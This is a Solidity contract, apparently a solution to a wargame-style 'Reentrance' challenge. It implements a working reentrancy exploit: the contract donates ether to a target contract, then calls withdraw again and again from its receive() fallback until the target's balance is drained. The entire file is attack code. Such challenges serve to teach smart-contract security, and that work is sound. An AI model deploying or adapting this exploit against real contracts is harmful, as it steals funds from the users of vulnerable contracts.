// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./10-Reentrance.sol";
import "hardhat/console.sol";

contract ReentranceAttacker {
    Reentrance public reentrance;
    uint256 public initialDeposit;

    constructor(address payable _reentranceAddress) public payable {
        reentrance = Reentrance(_reentranceAddress);
    }

    function attack() external payable {

        // first deposit some funds
        initialDeposit = msg.value;
        reentrance.donate{value: initialDeposit}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(reentrance).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = initialDeposit < challengeTotalRemainingBalance
                ? initialDeposit
                : challengeTotalRemainingBalance;
            reentrance.withdraw(toWithdraw);
        }
    }
}
